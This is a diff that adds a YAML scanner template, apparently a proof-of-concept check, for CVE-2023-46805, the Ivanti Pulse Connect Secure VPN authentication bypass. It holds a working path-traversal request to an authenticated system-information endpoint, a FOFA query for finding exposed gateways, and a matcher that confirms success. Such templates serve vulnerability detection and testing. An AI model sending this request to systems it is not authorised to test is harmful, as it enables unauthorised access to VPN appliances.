@@ -1,0 +1,16 @@
+id: poc-yaml-ivanti-pulse-connect-secure-vpn-authentication-bypass
+info:
+  name: Ivanti Pulse Connect Secure VPN 身份认证绕过漏洞(CVE-2023-46805)
+  severity: high
+  tags:
+  - CVE-2023-46805
+  - 两高一弱
+  finger: connect_secure
+  fofa: title="SSL gateway" && is_domain=false
+requests:
+- method: GET
+  path: /api/v1/totp/user-backup-code/../../system/system-information
+  expression: status_code == 200 && contains(body,"build") && contains(body,"system-information")
+    && contains(body,"software-inventory") && contains(headers,"application/json")
+variables: {}
+transport: http
